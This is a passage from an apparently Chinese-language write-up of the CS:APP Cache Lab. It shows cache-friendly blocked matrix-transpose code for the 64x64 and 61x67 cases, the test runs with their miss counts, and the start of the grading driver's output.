</span><span id=__span-138-35><a id=__codelineno-138-35 name=__codelineno-138-35></a><span class=w>                </span><span class=n>a_2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>6</span><span class=p>];</span>
</span><span id=__span-138-36><a id=__codelineno-138-36 name=__codelineno-138-36></a><span class=w>                </span><span class=n>a_3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>7</span><span class=p>];</span>
</span><span id=__span-138-37><a id=__codelineno-138-37 name=__codelineno-138-37></a><span class=w>                </span><span class=c1>// 得到A的第3块</span>
</span><span id=__span-138-38><a id=__codelineno-138-38 name=__codelineno-138-38></a><span class=w>                </span><span class=n>a_4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>][</span><span class=n>k</span><span class=p>];</span>
</span><span id=__span-138-39><a id=__codelineno-138-39 name=__codelineno-138-39></a><span class=w>                </span><span class=n>a_5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>5</span><span class=p>][</span><span class=n>k</span><span class=p>];</span>
</span><span id=__span-138-40><a id=__codelineno-138-40 name=__codelineno-138-40></a><span class=w>                </span><span class=n>a_6</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>6</span><span class=p>][</span><span class=n>k</span><span class=p>];</span>
</span><span id=__span-138-41><a id=__codelineno-138-41 name=__codelineno-138-41></a><span class=w>                </span><span class=n>a_7</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>7</span><span class=p>][</span><span class=n>k</span><span class=p>];</span>
</span><span id=__span-138-42><a id=__codelineno-138-42 name=__codelineno-138-42></a><span class=w>                </span><span class=c1>// 复制给B的第2块</span>
</span><span id=__span-138-43><a id=__codelineno-138-43 name=__codelineno-138-43></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_4</span><span class=p>;</span>
</span><span id=__span-138-44><a id=__codelineno-138-44 name=__codelineno-138-44></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>5</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_5</span><span class=p>;</span>
</span><span id=__span-138-45><a id=__codelineno-138-45 name=__codelineno-138-45></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>6</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_6</span><span class=p>;</span>
</span><span id=__span-138-46><a id=__codelineno-138-46 name=__codelineno-138-46></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>7</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_7</span><span class=p>;</span>
</span><span id=__span-138-47><a id=__codelineno-138-47 name=__codelineno-138-47></a><span class=w>                </span><span class=c1>// B原来的第2块移动到第3块</span>
</span><span id=__span-138-48><a id=__codelineno-138-48 name=__codelineno-138-48></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>0</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_0</span><span class=p>;</span>
</span><span id=__span-138-49><a id=__codelineno-138-49 name=__codelineno-138-49></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_1</span><span class=p>;</span>
</span><span id=__span-138-50><a id=__codelineno-138-50 name=__codelineno-138-50></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>2</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_2</span><span class=p>;</span>
</span><span id=__span-138-51><a id=__codelineno-138-51 name=__codelineno-138-51></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>3</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_3</span><span class=p>;</span>
</span><span id=__span-138-52><a id=__codelineno-138-52 name=__codelineno-138-52></a><span class=w>            </span><span class=p>}</span>
</span><span id=__span-138-53><a id=__codelineno-138-53 name=__codelineno-138-53></a>
</span><span id=__span-138-54><a id=__codelineno-138-54 name=__codelineno-138-54></a><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>8</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-138-55><a id=__codelineno-138-55 name=__codelineno-138-55></a><span class=w>            </span><span class=p>{</span>
</span><span id=__span-138-56><a id=__codelineno-138-56 name=__codelineno-138-56></a><span class=w>                </span><span class=c1>// 处理第4块</span>
</span><span id=__span-138-57><a id=__codelineno-138-57 name=__codelineno-138-57></a><span class=w>                </span><span class=n>a_4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>];</span>
</span><span id=__span-138-58><a id=__codelineno-138-58 name=__codelineno-138-58></a><span class=w>                </span><span class=n>a_5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>5</span><span class=p>];</span>
</span><span id=__span-138-59><a id=__codelineno-138-59 name=__codelineno-138-59></a><span class=w>                </span><span class=n>a_6</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>6</span><span class=p>];</span>
</span><span id=__span-138-60><a id=__codelineno-138-60 name=__codelineno-138-60></a><span class=w>                </span><span class=n>a_7</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>7</span><span class=p>];</span>
</span><span id=__span-138-61><a id=__codelineno-138-61 name=__codelineno-138-61></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_4</span><span class=p>;</span>
</span><span id=__span-138-62><a id=__codelineno-138-62 name=__codelineno-138-62></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>5</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_5</span><span class=p>;</span>
</span><span id=__span-138-63><a id=__codelineno-138-63 name=__codelineno-138-63></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>6</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_6</span><span class=p>;</span>
</span><span id=__span-138-64><a id=__codelineno-138-64 name=__codelineno-138-64></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>7</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_7</span><span class=p>;</span>
</span><span id=__span-138-65><a id=__codelineno-138-65 name=__codelineno-138-65></a><span class=w>            </span><span class=p>}</span>
</span><span id=__span-138-66><a id=__codelineno-138-66 name=__codelineno-138-66></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-138-67><a id=__codelineno-138-67 name=__codelineno-138-67></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-138-68><a id=__codelineno-138-68 name=__codelineno-138-68></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>结果 miss为 1227，通过：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-139-1> 1</a></span>
<span class=normal><a href=#__codelineno-139-2> 2</a></span>
<span class=normal><a href=#__codelineno-139-3> 3</a></span>
<span class=normal><a href=#__codelineno-139-4> 4</a></span>
<span class=normal><a href=#__codelineno-139-5> 5</a></span>
<span class=normal><a href=#__codelineno-139-6> 6</a></span>
<span class=normal><a href=#__codelineno-139-7> 7</a></span>
<span class=normal><a href=#__codelineno-139-8> 8</a></span>
<span class=normal><a href=#__codelineno-139-9> 9</a></span>
<span class=normal><a href=#__codelineno-139-10>10</a></span>
<span class=normal><a href=#__codelineno-139-11>11</a></span>
<span class=normal><a href=#__codelineno-139-12>12</a></span>
<span class=normal><a href=#__codelineno-139-13>13</a></span>
<span class=normal><a href=#__codelineno-139-14>14</a></span>
<span class=normal><a href=#__codelineno-139-15>15</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-139-1><a id=__codelineno-139-1 name=__codelineno-139-1></a><span class=m>05</span>-Cache-Lab$<span class=w> </span>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./test-trans<span class=w> </span>-M<span class=w> </span><span class=m>64</span><span class=w> </span>-N<span class=w> </span><span class=m>64</span>
</span><span id=__span-139-2><a id=__codelineno-139-2 name=__codelineno-139-2></a>...
</span><span id=__span-139-3><a id=__codelineno-139-3 name=__codelineno-139-3></a>Function<span class=w> </span><span class=m>0</span><span class=w> </span><span class=o>(</span><span class=m>2</span><span class=w> </span>total<span class=o>)</span>
</span><span id=__span-139-4><a id=__codelineno-139-4 name=__codelineno-139-4></a>Step<span class=w> </span><span class=m>1</span>:<span class=w> </span>Validating<span class=w> </span>and<span class=w> </span>generating<span class=w> </span>memory<span class=w> </span>traces
</span><span id=__span-139-5><a id=__codelineno-139-5 name=__codelineno-139-5></a>Step<span class=w> </span><span class=m>2</span>:<span class=w> </span>Evaluating<span class=w> </span>performance<span class=w> </span><span class=o>(</span><span class=nv>s</span><span class=o>=</span><span class=m>5</span>,<span class=w> </span><span class=nv>E</span><span class=o>=</span><span class=m>1</span>,<span class=w> </span><span class=nv>b</span><span class=o>=</span><span class=m>5</span><span class=o>)</span>
</span><span id=__span-139-6><a id=__codelineno-139-6 name=__codelineno-139-6></a>func<span class=w> </span><span class=m>0</span><span class=w> </span><span class=o>(</span>Transpose<span class=w> </span>submission<span class=o>)</span>:<span class=w> </span>hits:9017,<span class=w> </span>misses:1228,<span class=w> </span>evictions:1196
</span><span id=__span-139-7><a id=__codelineno-139-7 name=__codelineno-139-7></a>
</span><span id=__span-139-8><a id=__codelineno-139-8 name=__codelineno-139-8></a>Function<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span><span class=m>2</span><span class=w> </span>total<span class=o>)</span>
</span><span id=__span-139-9><a id=__codelineno-139-9 name=__codelineno-139-9></a>Step<span class=w> </span><span class=m>1</span>:<span class=w> </span>Validating<span class=w> </span>and<span class=w> </span>generating<span class=w> </span>memory<span class=w> </span>traces
</span><span id=__span-139-10><a id=__codelineno-139-10 name=__codelineno-139-10></a>Step<span class=w> </span><span class=m>2</span>:<span class=w> </span>Evaluating<span class=w> </span>performance<span class=w> </span><span class=o>(</span><span class=nv>s</span><span class=o>=</span><span class=m>5</span>,<span class=w> </span><span class=nv>E</span><span class=o>=</span><span class=m>1</span>,<span class=w> </span><span class=nv>b</span><span class=o>=</span><span class=m>5</span><span class=o>)</span>
</span><span id=__span-139-11><a id=__codelineno-139-11 name=__codelineno-139-11></a>func<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>Simple<span class=w> </span>row-wise<span class=w> </span>scan<span class=w> </span>transpose<span class=o>)</span>:<span class=w> </span>hits:3473,<span class=w> </span>misses:4724,<span class=w> </span>evictions:4692
</span><span id=__span-139-12><a id=__codelineno-139-12 name=__codelineno-139-12></a>
</span><span id=__span-139-13><a id=__codelineno-139-13 name=__codelineno-139-13></a>Summary<span class=w> </span><span class=k>for</span><span class=w> </span>official<span class=w> </span>submission<span class=w> </span><span class=o>(</span>func<span class=w> </span><span class=m>0</span><span class=o>)</span>:<span class=w> </span><span class=nv>correctness</span><span class=o>=</span><span class=m>1</span><span class=w> </span><span class=nv>misses</span><span class=o>=</span><span class=m>1228</span>
</span><span id=__span-139-14><a id=__codelineno-139-14 name=__codelineno-139-14></a>
</span><span id=__span-139-15><a id=__codelineno-139-15 name=__codelineno-139-15></a><span class=nv>TEST_TRANS_RESULTS</span><span class=o>=</span><span class=m>1</span>:1228
</span></code></pre></div></td></tr></table></div> <h4 id=61-x-67>61 x 67<a class=headerlink href=#61-x-67 title="Permanent link">¶</a></h4> <p>这个矩阵的转置要求很松，miss为 2000 以下就可以，直接 16 × 16 的分块就能通过：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-140-1>1</a></span>
<span class=normal><a href=#__codelineno-140-2>2</a></span>
<span class=normal><a href=#__codelineno-140-3>3</a></span>
<span class=normal><a href=#__codelineno-140-4>4</a></span>
<span class=normal><a href=#__codelineno-140-5>5</a></span>
<span class=normal><a href=#__codelineno-140-6>6</a></span>
<span class=normal><a href=#__codelineno-140-7>7</a></span>
<span class=normal><a href=#__codelineno-140-8>8</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-140-1><a id=__codelineno-140-1 name=__codelineno-140-1></a><span class=kt>void</span><span class=w> </span><span class=nf>transpose_61x67</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>M</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>N</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>N</span><span class=p>][</span><span class=n>M</span><span class=p>],</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>M</span><span class=p>][</span><span class=n>N</span><span class=p>])</span>
</span><span id=__span-140-2><a id=__codelineno-140-2 name=__codelineno-140-2></a><span class=p>{</span>
</span><span id=__span-140-3><a id=__codelineno-140-3 name=__codelineno-140-3></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>N</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mi>16</span><span class=p>)</span>
</span><span id=__span-140-4><a id=__codelineno-140-4 name=__codelineno-140-4></a><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>M</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mi>16</span><span class=p>)</span>
</span><span id=__span-140-5><a id=__codelineno-140-5 name=__codelineno-140-5></a><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>16</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>N</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-140-6><a id=__codelineno-140-6 name=__codelineno-140-6></a><span class=w>                </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>s</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>j</span><span class=p>;</span><span class=w> </span><span class=n>s</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>16</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>s</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>M</span><span class=p>;</span><span class=w> </span><span class=n>s</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-140-7><a id=__codelineno-140-7 name=__codelineno-140-7></a><span class=w>                    </span><span class=n>B</span><span class=p>[</span><span class=n>s</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>s</span><span class=p>];</span>
</span><span id=__span-140-8><a id=__codelineno-140-8 name=__codelineno-140-8></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-141-1> 1</a></span>
<span class=normal><a href=#__codelineno-141-2> 2</a></span>
<span class=normal><a href=#__codelineno-141-3> 3</a></span>
<span class=normal><a href=#__codelineno-141-4> 4</a></span>
<span class=normal><a href=#__codelineno-141-5> 5</a></span>
<span class=normal><a href=#__codelineno-141-6> 6</a></span>
<span class=normal><a href=#__codelineno-141-7> 7</a></span>
<span class=normal><a href=#__codelineno-141-8> 8</a></span>
<span class=normal><a href=#__codelineno-141-9> 9</a></span>
<span class=normal><a href=#__codelineno-141-10>10</a></span>
<span class=normal><a href=#__codelineno-141-11>11</a></span>
<span class=normal><a href=#__codelineno-141-12>12</a></span>
<span class=normal><a href=#__codelineno-141-13>13</a></span>
<span class=normal><a href=#__codelineno-141-14>14</a></span>
<span class=normal><a href=#__codelineno-141-15>15</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-141-1><a id=__codelineno-141-1 name=__codelineno-141-1></a><span class=m>05</span>-Cache-Lab$<span class=w> </span>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./test-trans<span class=w> </span>-M<span class=w> </span><span class=m>61</span><span class=w> </span>-N<span class=w> </span><span class=m>67</span>
</span><span id=__span-141-2><a id=__codelineno-141-2 name=__codelineno-141-2></a>...
</span><span id=__span-141-3><a id=__codelineno-141-3 name=__codelineno-141-3></a>Function<span class=w> </span><span class=m>0</span><span class=w> </span><span class=o>(</span><span class=m>2</span><span class=w> </span>total<span class=o>)</span>
</span><span id=__span-141-4><a id=__codelineno-141-4 name=__codelineno-141-4></a>Step<span class=w> </span><span class=m>1</span>:<span class=w> </span>Validating<span class=w> </span>and<span class=w> </span>generating<span class=w> </span>memory<span class=w> </span>traces
</span><span id=__span-141-5><a id=__codelineno-141-5 name=__codelineno-141-5></a>Step<span class=w> </span><span class=m>2</span>:<span class=w> </span>Evaluating<span class=w> </span>performance<span class=w> </span><span class=o>(</span><span class=nv>s</span><span class=o>=</span><span class=m>5</span>,<span class=w> </span><span class=nv>E</span><span class=o>=</span><span class=m>1</span>,<span class=w> </span><span class=nv>b</span><span class=o>=</span><span class=m>5</span><span class=o>)</span>
</span><span id=__span-141-6><a id=__codelineno-141-6 name=__codelineno-141-6></a>func<span class=w> </span><span class=m>0</span><span class=w> </span><span class=o>(</span>Transpose<span class=w> </span>submission<span class=o>)</span>:<span class=w> </span>hits:6186,<span class=w> </span>misses:1993,<span class=w> </span>evictions:1961
</span><span id=__span-141-7><a id=__codelineno-141-7 name=__codelineno-141-7></a>
</span><span id=__span-141-8><a id=__codelineno-141-8 name=__codelineno-141-8></a>Function<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span><span class=m>2</span><span class=w> </span>total<span class=o>)</span>
</span><span id=__span-141-9><a id=__codelineno-141-9 name=__codelineno-141-9></a>Step<span class=w> </span><span class=m>1</span>:<span class=w> </span>Validating<span class=w> </span>and<span class=w> </span>generating<span class=w> </span>memory<span class=w> </span>traces
</span><span id=__span-141-10><a id=__codelineno-141-10 name=__codelineno-141-10></a>Step<span class=w> </span><span class=m>2</span>:<span class=w> </span>Evaluating<span class=w> </span>performance<span class=w> </span><span class=o>(</span><span class=nv>s</span><span class=o>=</span><span class=m>5</span>,<span class=w> </span><span class=nv>E</span><span class=o>=</span><span class=m>1</span>,<span class=w> </span><span class=nv>b</span><span class=o>=</span><span class=m>5</span><span class=o>)</span>
</span><span id=__span-141-11><a id=__codelineno-141-11 name=__codelineno-141-11></a>func<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>Simple<span class=w> </span>row-wise<span class=w> </span>scan<span class=w> </span>transpose<span class=o>)</span>:<span class=w> </span>hits:3755,<span class=w> </span>misses:4424,<span class=w> </span>evictions:4392
</span><span id=__span-141-12><a id=__codelineno-141-12 name=__codelineno-141-12></a>
</span><span id=__span-141-13><a id=__codelineno-141-13 name=__codelineno-141-13></a>Summary<span class=w> </span><span class=k>for</span><span class=w> </span>official<span class=w> </span>submission<span class=w> </span><span class=o>(</span>func<span class=w> </span><span class=m>0</span><span class=o>)</span>:<span class=w> </span><span class=nv>correctness</span><span class=o>=</span><span class=m>1</span><span class=w> </span><span class=nv>misses</span><span class=o>=</span><span class=m>1993</span>
</span><span id=__span-141-14><a id=__codelineno-141-14 name=__codelineno-141-14></a>
</span><span id=__span-141-15><a id=__codelineno-141-15 name=__codelineno-141-15></a><span class=nv>TEST_TRANS_RESULTS</span><span class=o>=</span><span class=m>1</span>:1993
</span></code></pre></div></td></tr></table></div> <p>最后的评分：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-142-1> 1</a></span>
<span class=normal><a href=#__codelineno-142-2> 2</a></span>
<span class=normal><a href=#__codelineno-142-3> 3</a></span>
<span class=normal><a href=#__codelineno-142-4> 4</a></span>
<span class=normal><a href=#__codelineno-142-5> 5</a></span>
<span class=normal><a href=#__codelineno-142-6> 6</a></span>
<span class=normal><a href=#__codelineno-142-7> 7</a></span>
<span class=normal><a href=#__codelineno-142-8> 8</a></span>
<span class=normal><a href=#__codelineno-142-9> 9</a></span>
<span class=normal><a href=#__codelineno-142-10>10</a></span>
<span class=normal><a href=#__codelineno-142-11>11</a></span>
<span class=normal><a href=#__codelineno-142-12>12</a></span>
<span class=normal><a href=#__codelineno-142-13>13</a></span>
<span class=normal><a href=#__codelineno-142-14>14</a></span>
<span class=normal><a href=#__codelineno-142-15>15</a></span>
<span class=normal><a href=#__codelineno-142-16>16</a></span>
<span class=normal><a href=#__codelineno-142-17>17</a></span>
<span class=normal><a href=#__codelineno-142-18>18</a></span>
<span class=normal><a href=#__codelineno-142-19>19</a></span>
<span class=normal><a href=#__codelineno-142-20>20</a></span>
<span class=normal><a href=#__codelineno-142-21>21</a></span>
<span class=normal><a href=#__codelineno-142-22>22</a></span>
<span class=normal><a href=#__codelineno-142-23>23</a></span>
<span class=normal><a href=#__codelineno-142-24>24</a></span>
<span class=normal><a href=#__codelineno-142-25>25</a></span>
<span class=normal><a href=#__codelineno-142-26>26</a></span>
<span class=normal><a href=#__codelineno-142-27>27</a></span>
<span class=normal><a href=#__codelineno-142-28>28</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-142-1><a id=__codelineno-142-1 name=__codelineno-142-1></a><span class=m>05</span>-Cache-Lab$<span class=w> </span>python2<span class=w> </span>driver.py<span class=w> </span>
</span><span id=__span-142-2><a id=__codelineno-142-2 name=__codelineno-142-2></a>Part<span class=w> </span>A:<span class=w> </span>Testing<span class=w> </span>cache<span class=w> </span>simulator
</span><span id=__span-142-3><a id=__codelineno-142-3 name=__codelineno-142-3></a>Running<span class=w> </span>./test-csim
</span><span id=__span-142-4><a id=__codelineno-142-4 name=__codelineno-142-4></a><span class=w>                        </span>Your<span class=w> </span>simulator<span class=w>     </span>Reference<span class=w> </span>simulator
</span><span id=__span-142-5><a id=__codelineno-142-5 name=__codelineno-142-5></a>Points<span class=w> </span><span class=o>(</span>s,E,b<span class=o>)</span><span class=w>    </span>Hits<span class=w>  </span>Misses<span class=w>  </span>Evicts<span class=w>    </span>Hits<span class=w>  </span>Misses<span class=w>  </span>Evicts
</span><span id=__span-142-6><a id=__codelineno-142-6 name=__codelineno-142-6></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>1</span>,1,1<span class=o>)</span><span class=w>      </span><span class=m>9</span><span class=w>       </span><span class=m>8</span><span class=w>       </span><span class=m>6</span><span class=w>       </span><span class=m>9</span><span class=w>       </span><span class=m>8</span><span class=w>       </span><span class=m>6</span><span class=w>  </span>traces/yi2.trace
</span><span id=__span-142-7><a id=__codelineno-142-7 name=__codelineno-142-7></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>4</span>,2,4<span class=o>)</span><span class=w>      </span><span class=m>4</span><span class=w>       </span><span class=m>5</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>4</span><span class=w>       </span><span class=m>5</span><span class=w>       </span><span class=m>2</span><span class=w>  </span>traces/yi.trace
</span><span id=__span-142-8><a id=__codelineno-142-8 name=__codelineno-142-8></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>2</span>,1,4<span class=o>)</span><span class=w>      </span><span class=m>2</span><span class=w>       </span><span class=m>3</span><span class=w>       </span><span class=m>1</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>3</span><span class=w>       </span><span class=m>1</span><span class=w>  </span>traces/dave.trace
</span><span id=__span-142-9><a id=__codelineno-142-9 name=__codelineno-142-9></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>2</span>,1,3<span class=o>)</span><span class=w>    </span><span class=m>167</span><span class=w>      </span><span class=m>71</span><span class=w>      </span><span class=m>67</span><span class=w>     </span><span class=m>167</span><span class=w>      </span><span class=m>71</span><span class=w>      </span><span class=m>67</span><span class=w>  </span>traces/trans.trace
</span><span id=__span-142-10><a id=__codelineno-142-10 name=__codelineno-142-10></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>2</span>,2,3<span class=o>)</span><span class=w>    </span><span class=m>201</span><span class=w>      </span><span class=m>37</span><span class=w>      </span><span class=m>29</span><span class=w>     </span><span class=m>201</span><span class=w>      </span><span class=m>37</span><span class=w>      </span><span class=m>29</span><span class=w>  </span>traces/trans.trace
</span><span id=__span-142-11><a id=__codelineno-142-11 name=__codelineno-142-11></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>2</span>,4,3<span class=o>)</span><span class=w>    </span><span class=m>212</span><span class=w>      </span><span class=m>26</span><span class=w>      </span><span class=m>10</span><span class=w>     </span><span class=m>212</span><span class=w>      </span><span class=m>26</span><span class=w>      </span><span class=m>10</span><span class=w>  </span>traces/trans.trace
</span><span id=__span-142-12><a id=__codelineno-142-12 name=__codelineno-142-12></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>5</span>,1,5<span class=o>)</span><span class=w>    </span><span class=m>231</span><span class=w>       </span><span class=m>7</span><span class=w>       </span><span class=m>0</span><span class=w>     </span><span class=m>231</span><span class=w>       </span><span class=m>7</span><span class=w>       </span><span class=m>0</span><span class=w>  </span>traces/trans.trace
